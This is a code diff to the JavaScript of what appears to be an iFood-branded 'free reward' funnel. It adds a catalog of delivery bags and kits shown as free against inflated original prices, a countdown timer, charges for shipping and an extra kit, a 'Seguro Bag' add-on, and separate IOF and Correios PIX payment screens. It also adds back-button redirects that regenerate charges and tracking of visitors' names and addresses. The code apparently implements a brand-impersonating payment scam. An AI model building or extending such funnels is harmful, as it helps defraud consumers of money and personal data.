@@ -96,6 +96,7 @@ const STORAGE_KEYS = {
     stock: 'ifoodbag.stock',
     returnTo: 'ifoodbag.returnTo',
     shipping: 'ifoodbag.shipping',
+    reward: 'ifoodbag.reward',
     addressExtra: 'ifoodbag.addressExtra',
     pix: 'ifoodbag.pix',
     bump: 'ifoodbag.bump',
@@ -109,6 +110,39 @@ const STORAGE_KEYS = {
     orderbumpBackAutoPix: 'ifoodbag.orderbumpBackAutoPix',
     pixCreateLock: 'ifoodbag.pixCreateLock',
     pixelEventDedupe: 'ifoodbag.pixelEventDedupe'
+};
+
+const REWARD_CATALOG = {
+    bau: {
+        id: 'bau',
+        name: 'Bau do iFood',
+        asset: 'assets/__task____isolate_ifood_delivery_box_white_background_,_202603260112 (1).webp',
+        successOriginalPrice: 249.9,
+        successDisplayPrice: 0,
+        checkoutExtraPrice: 0,
+        pixTitle: 'Bau do iFood',
+        pixAlt: 'Bau do iFood'
+    },
+    bag: {
+        id: 'bag',
+        name: 'Bag do iFood',
+        asset: 'assets/bagfoto.webp',
+        successOriginalPrice: 149.9,
+        successDisplayPrice: 0,
+        checkoutExtraPrice: 0,
+        pixTitle: 'Bag do iFood',
+        pixAlt: 'Bag do iFood'
+    },
+    kit_entregador: {
+        id: 'kit_entregador',
+        name: 'Kit Entregador iFood',
+        asset: 'assets/__task____fix_ifood_logo_on_jacket_,_202603260102 (1).webp',
+        successOriginalPrice: 449.9,
+        successDisplayPrice: 97.9,
+        checkoutExtraPrice: 97.9,
+        pixTitle: 'Kit Entregador iFood',
+        pixAlt: 'Kit Entregador iFood'
+    }
 };
 
 const state = {
@@ -580,10 +614,15 @@ function setupGlobalBackRedirect(page) {
                     if (!isUpsellPix) {
                         const shippingStored = loadShipping();
                         const shippingWithCoupon = applyCouponToShipping(shippingStored);
+                        const reward = loadRewardSelection();
+                        const rewardExtraPrice = Number(pix?.rewardExtraPrice || getRewardExtraPrice(reward));
                         const bump = loadBump() || {};
                         const bumpSelected = bump?.selected === true && Number(bump?.price || 0) > 0;
                         const bumpPrice = bumpSelected ? Number(bump.price || 0) : 0;
-                        const fallbackShippingBase = Math.max(0, Number((Number(pix?.amount || 0) - bumpPrice).toFixed(2)));
+                        const fallbackShippingBase = Math.max(
+                            0,
+                            Number((Number(pix?.amount || 0) - bumpPrice - rewardExtraPrice).toFixed(2))
+                        );
                         const shippingForRegeneration = shippingWithCoupon || (
                             shippingStored
                                 ? applyCouponToShipping({
@@ -1503,19 +1542,66 @@ function initSuccess() {
     trackLead('success_view', { stage: 'success' });
 
     const personal = loadPersonal();
+    const rewardCards = Array.from(document.querySelectorAll('.success-reward-card'));
     const leadName = document.getElementById('lead-name');
     const timer = document.getElementById('timer');
     const btnCheckout = document.getElementById('btn-checkout');
+    let selectedReward = loadRewardSelection();
 
     if (leadName && personal?.name) {
         const firstName = personal.name.trim().split(/\s+/)[0];
         leadName.textContent = firstName || personal.name;
     }
 
+    const applyRewardState = (reward) => {
+        rewardCards.forEach((card) => {
+            const isSelected = reward?.id === card.dataset.rewardId;
+            card.classList.toggle('is-selected', isSelected);
+            card.setAttribute('aria-pressed', isSelected ? 'true' : 'false');
+        });
+        if (btnCheckout) btnCheckout.disabled = !reward;
+    };
+
+    if (!selectedReward) {
+        clearRewardSelection();
+    }
+    applyRewardState(selectedReward);
+
+    rewardCards.forEach((card) => {
+        card.addEventListener('click', () => {
+            const previousRewardId = String(selectedReward?.id || '').trim();
+            const reward = resolveRewardSelection({
+                id: card.dataset.rewardId,
+                selectedAt: Date.now()
+            });
+            if (!reward) return;
+            if (previousRewardId && previousRewardId !== reward.id) {
+                localStorage.removeItem(STORAGE_KEYS.pix);
+            }
+            saveRewardSelection(reward);
+            selectedReward = loadRewardSelection();
+            applyRewardState(selectedReward);
+            trackLead('reward_selected', {
+                stage: 'success',
+                reward: selectedReward,
+                amount: getRewardExtraPrice(selectedReward)
+            });
+        });
+    });
+
     startTimer(300, timer);
 
     btnCheckout?.addEventListener('click', () => {
-        trackLead('success_cta', { stage: 'success' });
+        const reward = loadRewardSelection();
+        if (!reward) {
+            showToast('Escolha 1 item para continuar.', 'error');
+            return;
+        }
+        trackLead('success_cta', {
+            stage: 'success',
+            reward,
+            amount: getRewardExtraPrice(reward)
+        });
         setStage('checkout');
         redirect('checkout.html');
     });
@@ -1525,12 +1611,24 @@ function initCheckout() {
     const directCheckout = isDirectCheckoutMode();
     if (!directCheckout && !requirePersonal()) return;
     if (!directCheckout && !requireAddress()) return;
+    const reward = loadRewardSelection();
+    if (!reward) {
+        setStage('success');
+        redirect('sucesso.html');
+        return;
+    }
 
     setStage('checkout');
-    trackLead('checkout_view', { stage: 'checkout' });
+    trackLead('checkout_view', {
+        stage: 'checkout',
+        reward,
+        amount: getRewardExtraPrice(reward)
+    });
     const personal = loadPersonal();
     let address = loadAddress() || {};
     let shipping = loadShipping();
+    const rewardExtraPrice = getRewardExtraPrice(reward);
+    const isKitReward = reward.id === 'kit_entregador';
     const checkoutParams = new URLSearchParams(window.location.search || '');
     const forceFreteSelection = checkoutParams.get('forceFrete') === '1';
     if (forceFreteSelection) {
@@ -1576,6 +1674,10 @@ function initCheckout() {
     const freightOptions = document.getElementById('freight-options');
     const freightHint = document.getElementById('freight-hint');
     const shippingTotal = document.getElementById('shipping-total');
+    const rewardKitTotal = document.getElementById('reward-kit-total');
+    const rewardKitPrice = document.getElementById('reward-kit-price');
+    const checkoutGrandTotal = document.getElementById('checkout-grand-total');
+    const checkoutGrandTotalPrice = document.getElementById('checkout-grand-total-price');
     const btnFinish = document.getElementById('btn-finish');
     const couponBanner = document.getElementById('coupon-banner');
     const btnEditData = document.querySelector('.action-stack a[href^="dados"]');
@@ -1596,6 +1698,44 @@ function initCheckout() {
             return `${option.name} - de ${formatCurrency(originalPrice)} por ${currentPrice}`;
         }
         return `${option.name} - ${currentPrice}`;
+    };
+
+    const formatShippingPriceHtml = (option) => {
+        const currentPrice = Number(option?.price || 0);
+        const originalPrice = Number(option?.originalPrice || 0);
+        if (originalPrice > currentPrice) {
+            return `<span class="price-old">${formatCurrency(originalPrice)}</span><span class="price-new">${formatCurrency(currentPrice)}</span>`;
+        }
+        return formatCurrency(currentPrice);
+    };
+
+    const updateCheckoutTotals = (selectedShipping = shipping) => {
+        if (shippingTotal) {
+            if (selectedShipping) {
+                const strong = shippingTotal.querySelector('strong');
+                if (strong) strong.innerHTML = formatShippingPriceHtml(selectedShipping);
+                setHidden(shippingTotal, false);
+            } else {
+                setHidden(shippingTotal, true);
+            }
+        }
+
+        if (rewardKitTotal) {
+            const showRewardExtra = isKitReward;
+            if (showRewardExtra && rewardKitPrice) {
+                rewardKitPrice.textContent = formatCurrency(rewardExtraPrice);
+            }
+            setHidden(rewardKitTotal, !showRewardExtra);
+        }
+
+        if (checkoutGrandTotal) {
+            const showGrandTotal = isKitReward && !!selectedShipping;
+            if (showGrandTotal && checkoutGrandTotalPrice) {
+                const total = Number((Number(selectedShipping?.price || 0) + rewardExtraPrice).toFixed(2));
+                checkoutGrandTotalPrice.textContent = formatCurrency(total);
+            }
+            setHidden(checkoutGrandTotal, !showGrandTotal);
+        }
     };
 
     const updateCheckoutActionPanel = () => {
@@ -1643,7 +1783,7 @@ function initCheckout() {
         couponBanner.classList.remove('hidden');
         couponBanner.innerHTML = `
             <strong>Cupom aplicado:</strong> ${coupon.code || 'FRETE5'}
-            <span>R$ ${amountOff.toFixed(2).replace('.', ',')} de desconto no frete da Bag</span>
+            <span>R$ ${amountOff.toFixed(2).replace('.', ',')} de desconto no frete do seu resgate</span>
         `;
     }
 
@@ -1928,16 +2068,7 @@ function initCheckout() {
         if (shouldTrack) {
             trackLead('frete_selected', { stage: 'checkout', shipping: selectedShipping });
         }
-        if (shippingTotal) {
-            const strong = shippingTotal.querySelector('strong');
-            const hasDiscount = Number(selectedShipping.originalPrice || 0) > Number(selectedShipping.price || 0);
-            if (strong) {
-                strong.innerHTML = hasDiscount
-                    ? `<span class="price-old">${formatCurrency(selectedShipping.originalPrice)}</span><span class="price-new">${formatCurrency(selectedShipping.price)}</span>`
-                    : formatCurrency(selectedShipping.price);
-            }
-            setHidden(shippingTotal, false);
-        }
+        updateCheckoutTotals(selectedShipping);
         const labels = freightOptions?.querySelectorAll('.freight-option') || [];
         labels.forEach((label) => {
             label.classList.toggle('freight-option--active', label.querySelector('input')?.value === selectedShipping.id);
@@ -1952,7 +2083,7 @@ function initCheckout() {
         if (freightOptions) freightOptions.innerHTML = '';
         setHidden(freightOptions, true);
         setHidden(freightHint, true);
-        setHidden(shippingTotal, true);
+        updateCheckoutTotals(null);
         updateCheckoutActionPanel();
     };
 
@@ -1996,7 +2127,7 @@ function initCheckout() {
         setHidden(freightLoading, false);
         setHidden(freightAddress, true);
         setHidden(freightOptions, true);
-        setHidden(shippingTotal, true);
+        updateCheckoutTotals(null);
         updateCheckoutActionPanel();
 
         if (summaryCep) summaryCep.textContent = formatCep(rawCep);
@@ -2085,16 +2216,7 @@ function initCheckout() {
         setHidden(summaryBlock, false);
         setHidden(freightForm, true);
         showFreightSelection();
-        if (shippingTotal) {
-            const strong = shippingTotal.querySelector('strong');
-            const hasDiscount = Number(shipping.originalPrice || 0) > Number(shipping.price || 0);
-            if (strong) {
-                strong.innerHTML = hasDiscount
-                    ? `<span class="price-old">${formatCurrency(shipping.originalPrice)}</span><span class="price-new">${formatCurrency(shipping.price)}</span>`
-                    : formatCurrency(shipping.price);
-            }
-            setHidden(shippingTotal, false);
-        }
+        updateCheckoutTotals(shipping);
         updateCheckoutActionPanel();
     }
 
@@ -2113,6 +2235,7 @@ function initCheckout() {
         }
     }
 
+    updateCheckoutTotals(shipping);
     updateCheckoutActionPanel();
 
     const syncShippingAfterAddressEdit = () => {
@@ -2136,26 +2259,19 @@ function initCheckout() {
             setHidden(freightForm, true);
             setHidden(summaryBlock, false);
             showFreightSelection();
-            if (shippingTotal) {
-                const strong = shippingTotal.querySelector('strong');
-                const hasDiscount = Number(storedShipping.originalPrice || 0) > Number(storedShipping.price || 0);
-                if (strong) {
-                    strong.innerHTML = hasDiscount
-                        ? `<span class="price-old">${formatCurrency(storedShipping.originalPrice)}</span><span class="price-new">${formatCurrency(storedShipping.price)}</span>`
-                        : formatCurrency(storedShipping.price);
-                }
-                setHidden(shippingTotal, false);
-            }
             if (btnCalcFreight) btnCalcFreight.classList.add('hidden');
             shipping = storedShipping;
+            updateCheckoutTotals(storedShipping);
             updateCheckoutActionPanel();
             return;
         }
 
+        shipping = null;
         setHidden(summaryBlock, false);
         setHidden(freightForm, true);
         if (cachedOptions) showFreightSelection();
         if (btnCalcFreight) btnCalcFreight.classList.add('hidden');
+        updateCheckoutTotals(null);
         updateCheckoutActionPanel();
     };
 
@@ -2187,7 +2303,8 @@ function initCheckout() {
             stage: 'checkout',
             shipping,
             bump: checkoutNeutralBump,
-            amount: Number(shipping?.price || 0)
+            reward,
+            amount: Number((Number(shipping?.price || 0) + rewardExtraPrice).toFixed(2))
         });
         const idleLabel = btnFinish.textContent;
         checkoutSubmitting = true;
@@ -2200,7 +2317,12 @@ function initCheckout() {
                     redirect('orderbump.html');
                     return;
                 }
-                trackLead('orderbump_skipped', { stage: 'checkout', shipping });
+                trackLead('orderbump_skipped', {
+                    stage: 'checkout',
+                    shipping,
+                    reward,
+                    amount: Number((Number(shipping?.price || 0) + rewardExtraPrice).toFixed(2))
+                });
                 showToast('Gerando pagamento...', 'success');
                 createPixCharge(shipping, 0).catch((error) => {
                     showToast(error.message || 'Erro ao gerar o PIX.', 'error');
@@ -2221,9 +2343,16 @@ function initCheckout() {
 function initOrderBump() {
     if (!requirePersonal()) return;
     if (!requireAddress()) return;
+    const reward = loadRewardSelection();
+    if (!reward) {
+        setStage('success');
+        redirect('sucesso.html');
+        return;
+    }
 
     const shippingStored = loadShipping();
     const shipping = applyCouponToShipping(shippingStored);
+    const rewardExtraPrice = getRewardExtraPrice(reward);
     if (!isShippingSelectionComplete(shipping)) {
         localStorage.removeItem(STORAGE_KEYS.shipping);
         setStage('checkout');
@@ -2241,14 +2370,20 @@ function initOrderBump() {
     trackLead('orderbump_view', {
         stage: 'orderbump',
         shipping,
+        reward,
         bump: neutralBump,
-        amount: Number(shipping?.price || 0)
+        amount: Number((Number(shipping?.price || 0) + rewardExtraPrice).toFixed(2))
     });
     const bumpPrice = 19.9;
 
     isOrderBumpEnabled().then((enabled) => {
         if (!enabled) {
-            trackLead('orderbump_skipped', { stage: 'orderbump', shipping });
+            trackLead('orderbump_skipped', {
+                stage: 'orderbump',
+                shipping,
+                reward,
+                amount: Number((Number(shipping?.price || 0) + rewardExtraPrice).toFixed(2))
+            });
             createPixCharge(shipping, 0).catch((error) => {
                 showToast(error.message || 'Erro ao gerar o PIX.', 'error');
                 setStage('checkout');
@@ -2263,7 +2398,7 @@ function initOrderBump() {
     const bumpMonthly = document.getElementById('bump-monthly');
     const bumpLoading = document.getElementById('bump-loading');
 
-    if (bumpTotal) bumpTotal.textContent = formatCurrency(shipping.price + bumpPrice);
+    if (bumpTotal) bumpTotal.textContent = formatCurrency(shipping.price + rewardExtraPrice + bumpPrice);
     if (bumpMonthly) bumpMonthly.textContent = formatCurrency(bumpPrice);
 
     const proceedToPix = (selected) => {
@@ -2279,7 +2414,9 @@ function initOrderBump() {
         trackLead(selected ? 'orderbump_accepted' : 'orderbump_declined', {
             stage: 'orderbump',
             bump: loadBump(),
-            shipping
+            shipping,
+            reward,
+            amount: Number((Number(shipping?.price || 0) + rewardExtraPrice + (selected ? bumpPrice : 0)).toFixed(2))
         });
 
         createPixCharge(shipping, selected ? bumpPrice : 0)
@@ -2717,6 +2854,7 @@ function initUpsell() {
 function initPix() {
     const pix = loadPix();
     const shipping = loadShipping();
+    const storedReward = loadRewardSelection();
     const shouldAutoCreateFromOrderbumpBack = sessionStorage.getItem(STORAGE_KEYS.orderbumpBackAutoPix) === '1';
     const pixTopbar = document.querySelector('.pix-topbar');
     const pixHero = document.querySelector('.pix-hero');
@@ -2730,6 +2868,10 @@ function initPix() {
     const pixTimer = document.getElementById('pix-timer');
     const pixProgress = document.getElementById('pix-progress-bar');
     const pixOrderId = document.getElementById('pix-order-id');
+    const pixOrderTitle = document.getElementById('pix-order-title');
+    const pixOrderImage = document.getElementById('pix-order-image');
+    const pixRewardRow = document.getElementById('pix-reward-row');
+    const pixRewardPrice = document.getElementById('pix-reward-price');
     const pixBumpRow = document.getElementById('pix-bump-row');
     const pixBumpPrice = document.getElementById('pix-bump-price');
     const btnCopy = document.getElementById('btn-copy-pix');
@@ -2746,6 +2888,11 @@ function initPix() {
     const pixCorreiosAmount = document.getElementById('pix-correios-amount');
     const pixCorreiosStatus = document.getElementById('pix-correios-status');
     const btnCopyCorreios = document.getElementById('btn-copy-pix-correios');
+    const reward = resolveRewardSelection({
+        id: pix?.rewardId || pix?.reward?.id || storedReward?.id || 'bag',
+        selectedAt: storedReward?.selectedAt || 0
+    });
+    const rewardExtraPrice = Number(pix?.rewardExtraPrice || getRewardExtraPrice(reward));
 
     const isUpsellPix = Boolean(
         pix?.isUpsell ||
@@ -2835,13 +2982,33 @@ function initPix() {
         pixCorreiosView.setAttribute('aria-hidden', 'true');
     }
 
-    trackLead('pix_view', { stage: 'pix', shipping });
+    trackLead('pix_view', {
+        stage: 'pix',
+        shipping,
+        reward,
+        amount: Number(pix?.amount || 0)
+    });
 
     if (pixAmount) pixAmount.textContent = formatCurrency(pix.amount || 0);
     if (pixIofAmount) pixIofAmount.textContent = formatCurrency(pix.amount || 0);
     if (pixCorreiosAmount) pixCorreiosAmount.textContent = formatCurrency(pix.amount || 0);
     if (pixIofStatus) pixIofStatus.textContent = 'Status: Aguardando pagamento';
     if (pixCorreiosStatus) pixCorreiosStatus.textContent = 'Status: Aguardando pagamento';
+    if (reward && pixOrderTitle) {
+        pixOrderTitle.textContent = String(pix?.rewardName || reward.pixTitle || reward.name);
+    }
+    if (reward && pixOrderImage) {
+        pixOrderImage.src = String(pix?.rewardAsset || reward.asset);
+        pixOrderImage.alt = String(pix?.rewardAlt || reward.pixAlt || reward.name);
+    }
+    if (pixRewardRow) {
+        if (rewardExtraPrice > 0 && pixRewardPrice) {
+            pixRewardPrice.textContent = formatCurrency(rewardExtraPrice);
+            pixRewardRow.classList.remove('hidden');
+        } else {
+            pixRewardRow.classList.add('hidden');
+        }
+    }
     if (pixBumpRow && pixBumpPrice && pix.bumpPrice) {
         pixBumpPrice.textContent = formatCurrency(pix.bumpPrice);
         pixBumpRow.classList.remove('hidden');
@@ -2996,6 +3163,7 @@ function initPix() {
             trackLead('pix_paid', {
                 stage: 'pix',
                 shipping,
+                reward,
                 pix: {
                     ...pix,
                     idTransaction: txid,
@@ -5223,6 +5391,63 @@ function buildShippingOptions(rawCep) {
     });
 }
 
+function resolveRewardById(value = '') {
+    const id = String(value || '').trim().toLowerCase();
+    if (!id || !Object.prototype.hasOwnProperty.call(REWARD_CATALOG, id)) return null;
+    return { ...REWARD_CATALOG[id] };
+}
+
+function resolveRewardSelection(value = null) {
+    if (value === undefined || value === null || value === '') return null;
+    const source = value && typeof value === 'object' && !Array.isArray(value)
+        ? value
+        : { id: value };
+    const reward = resolveRewardById(source?.id || source);
+    if (!reward) return null;
+    const selectedAt = Number(source?.selectedAt || 0);
+    return {
+        ...reward,
+        selectedAt: selectedAt > 0 ? selectedAt : 0
+    };
+}
+
+function getRewardExtraPrice(reward = null) {
+    return Number(reward?.checkoutExtraPrice || reward?.extraPrice || reward?.rewardExtraPrice || 0);
+}
+
+function saveRewardSelection(data) {
+    const reward = resolveRewardSelection(data);
+    if (!reward) {
+        clearRewardSelection();
+        return;
+    }
+    const payload = {
+        id: reward.id,
+        selectedAt: reward.selectedAt > 0 ? reward.selectedAt : Date.now()
+    };
+    localStorage.setItem(STORAGE_KEYS.reward, JSON.stringify(payload));
+}
+
+function loadRewardSelection() {
+    try {
+        const raw = localStorage.getItem(STORAGE_KEYS.reward);
+        if (!raw) return null;
+        const parsed = JSON.parse(raw);
+        const reward = resolveRewardSelection(parsed);
+        if (!reward) {
+            localStorage.removeItem(STORAGE_KEYS.reward);
+            return null;
+        }
+        return reward;
+    } catch (_error) {
+        return null;
+    }
+}
+
+function clearRewardSelection() {
+    localStorage.removeItem(STORAGE_KEYS.reward);
+}
+
 function saveShipping(data) {
     localStorage.setItem(STORAGE_KEYS.shipping, JSON.stringify(data));
 }
@@ -5403,6 +5628,12 @@ function canReuseRecentPixCharge(pixData, expected = {}) {
         return false;
     }
 
+    const expectedReward = String(expected.rewardId || '').trim();
+    const storedReward = String(pixData.rewardId || pixData.reward?.id || '').trim();
+    if (expectedReward && expectedReward !== storedReward) {
+        return false;
+    }
+
     if (Boolean(expected.isUpsell) !== Boolean(pixData.isUpsell)) {
         return false;
     }
@@ -5481,7 +5712,9 @@ async function createPixCharge(shipping, bumpPrice, options = {}) {
     const isUpsell = Boolean(options?.upsell?.enabled);
     const shippingInput = shipping && typeof shipping === 'object' ? { ...shipping } : null;
     const shippingForPix = isUpsell ? shippingInput : applyCouponToShipping(shippingInput);
+    const reward = resolveRewardSelection(options?.reward || loadRewardSelection() || 'bag') || resolveRewardById('bag');
     const shippingPrice = Number(shippingForPix?.price || 0);
+    const rewardExtraPrice = getRewardExtraPrice(reward);
     if (!shippingForPix || !Number.isFinite(shippingPrice) || shippingPrice < 0) {
         throw new Error('Selecione um frete valido antes de gerar o PIX.');
     }
@@ -5489,17 +5722,23 @@ async function createPixCharge(shipping, bumpPrice, options = {}) {
     const extraCharge = Number.isFinite(extraChargeRaw) && extraChargeRaw > 0
         ? Number(extraChargeRaw.toFixed(2))
         : 0;
-    const amount = Number((shippingPrice + extraCharge).toFixed(2));
+    const amount = Number((shippingPrice + rewardExtraPrice + extraCharge).toFixed(2));
     const sessionId = getLeadSessionId();
     const lockKey = [
         sessionId,
         isUpsell ? 'upsell' : 'base',
         String(shippingForPix?.id || ''),
+        String(reward?.id || 'bag'),
         String(amount.toFixed(2))
     ].join('|');
 
     const cachedPix = loadPix();
-    if (canReuseRecentPixCharge(cachedPix, { amount, shippingId: shippingForPix?.id || '', isUpsell })) {
+    if (canReuseRecentPixCharge(cachedPix, {
+        amount,
+        shippingId: shippingForPix?.id || '',
+        rewardId: reward?.id || 'bag',
+        isUpsell
+    })) {
         setStage('pix');
         redirect('pix.html');
         return;
@@ -5536,6 +5775,7 @@ async function createPixCharge(shipping, bumpPrice, options = {}) {
             sourceUrl: window.location.href,
             utm: getUtmData(),
             shipping: shippingForPix,
+            reward: reward ? { id: reward.id } : null,
             bump: extraCharge > 0 ? { title: 'Seguro Bag', price: extraCharge } : null,
             personal: getPixPersonalPayload(),
             address: getPixAddressPayload(),
@@ -5558,6 +5798,7 @@ async function createPixCharge(shipping, bumpPrice, options = {}) {
             trackLead(isUpsell ? 'upsell_pix_create_failed' : 'pix_create_failed', {
                 stage: isUpsell ? (String(options?.sourceStage || '').trim() || 'upsell') : 'orderbump',
                 shipping: shippingForPix,
+                reward,
                 bump: payload.bump,
                 amount
             });
@@ -5569,17 +5810,31 @@ async function createPixCharge(shipping, bumpPrice, options = {}) {
             amount,
             shippingId: shippingForPix.id,
             shippingName: shippingForPix.name,
+            rewardId: String(data?.rewardId || reward?.id || 'bag'),
+            rewardName: String(data?.rewardName || reward?.name || 'Bag do iFood'),
+            rewardExtraPrice: Number(data?.rewardExtraPrice || rewardExtraPrice || 0),
+            rewardAsset: reward?.asset || '',
+            rewardAlt: reward?.pixAlt || reward?.name || '',
             bumpName: extraCharge > 0 ? 'Seguro Bag' : '',
             bumpPrice: extraCharge,
             createdAt: Date.now(),
             isUpsell,
-            upsell: payload.upsell
+            upsell: payload.upsell,
+            reward: reward ? {
+                id: String(data?.rewardId || reward.id),
+                name: String(data?.rewardName || reward.name),
+                checkoutExtraPrice: Number(data?.rewardExtraPrice || rewardExtraPrice || 0),
+                asset: reward.asset,
+                pixTitle: reward.pixTitle,
+                pixAlt: reward.pixAlt
+            } : null
         };
         savePix(pixPayload);
         setStage('pix');
         trackLead(trackEventCreated, {
             stage: 'pix',
             shipping: shippingForPix,
+            reward,
             bump: payload.bump,
             pix: pixPayload,
             amount
@@ -6073,13 +6328,22 @@ function buildPixelValueData(payload = {}) {
     const explicitValue = Number(payload?.amount);
     const shippingValue = Number(payload?.shipping?.price || 0);
     const bumpValue = Number(payload?.bump?.price || 0);
-    const computedValue = Number.isFinite(shippingValue + bumpValue)
-        ? Number((shippingValue + bumpValue).toFixed(2))
+    const rewardValue = Number(
+        payload?.reward?.checkoutExtraPrice ||
+        payload?.reward?.extraPrice ||
+        payload?.pix?.rewardExtraPrice ||
+        0
+    );
+    const computedValue = Number.isFinite(shippingValue + bumpValue + rewardValue)
+        ? Number((shippingValue + bumpValue + rewardValue).toFixed(2))
         : 0;
     const totalValue = Number.isFinite(explicitValue) && explicitValue > 0 ? explicitValue : computedValue;
+    const contentName = payload?.isUpsell
+        ? String(payload?.upsell?.title || payload?.shipping?.name || payload?.reward?.name || '').trim()
+        : String(payload?.reward?.name || payload?.shipping?.name || payload?.upsell?.title || '').trim();
     return {
         totalValue,
-        contentName: String(payload?.shipping?.name || payload?.upsell?.title || '').trim(),
+        contentName,
         contentCategory: payload?.isUpsell ? 'upsell' : 'checkout'
     };
 }
@@ -6322,6 +6586,7 @@ function trackLead(eventName, extra = {}) {
         address: extra.address || loadAddress() || {},
         extra: extra.extra || loadAddressExtra() || {},
         shipping: extra.shipping || loadShipping() || {},
+        reward: extra.reward || loadRewardSelection() || {},
         bump: extra.bump || loadBump() || {},
         pix: extra.pix || loadPix() || {},
         quiz: extra.quiz || {},
@@ -6473,6 +6738,7 @@ function resetFlow() {
     localStorage.removeItem(STORAGE_KEYS.quizComplete);
     localStorage.removeItem(STORAGE_KEYS.stage);
     localStorage.removeItem(STORAGE_KEYS.shipping);
+    localStorage.removeItem(STORAGE_KEYS.reward);
     localStorage.removeItem(STORAGE_KEYS.addressExtra);
     localStorage.removeItem(STORAGE_KEYS.pix);
     localStorage.removeItem(STORAGE_KEYS.bump);
